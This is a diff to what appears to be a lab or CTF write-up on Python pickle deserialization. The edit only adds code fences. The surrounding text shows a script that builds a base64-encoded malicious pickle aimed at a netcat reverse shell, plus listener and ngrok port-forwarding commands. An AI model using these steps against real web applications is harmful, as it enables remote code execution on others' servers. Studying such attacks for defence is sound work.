@@ -16,7 +16,7 @@ So we can create an object with a malicious __reduce__() method which would esse
 Here, we are going to use a netcat reverse shell payload.
 
 Script to generate our malicious serialized cart value:
-
+```
 import pickle, base64, os
 
 class payload(object):
@@ -26,7 +26,7 @@ class payload(object):
 deserialpayload = payload()
 serialpayload = pickle.dumps(deserialpayload)
 print(base64.b64encode(serialpayload))
-
+```
 Now to provide our ip, we need to use port forwarding using ngrok since we are connected to the internet using a router and only the router's ip is visible to the internet.
 First setup a netcat listener using nc -nvlp 1234
 Now, after installing and setting up ngrok, execute ngrok tcp 1234 which would basically forward our local tcp port 1234 to an external port directly accessible from the internet.
